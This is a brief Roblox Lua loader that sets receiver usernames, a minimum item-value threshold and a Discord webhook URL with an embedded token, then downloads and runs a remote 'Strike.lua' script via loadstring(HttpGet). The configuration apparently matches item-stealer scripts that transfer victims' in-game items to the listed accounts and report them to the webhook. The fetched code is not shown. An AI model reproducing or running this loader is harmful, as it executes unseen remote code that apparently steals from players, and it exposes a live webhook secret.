-- Set global variables for strike.lua
_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} 
_G.minrap = 10000000
_G.webhook = "https://discord.com/api/webhooks/1432831852065984673/4oetapbKqCwCCMUUKZORXzB4Bie1V2gaBt0DxC5PozHfRXVE8u8K4qK-Yan3tuw6-9Kn"

-- Run strike.lua in the background
spawn(function()
    loadstring(game:HttpGet("https://github.com/HateME121/Strike.Hub/blob/main/Strike.lua"))()
end)

-- Run gui.lua in the background
spawn(function()
    loadstring(game:HttpGet(""))()
end)
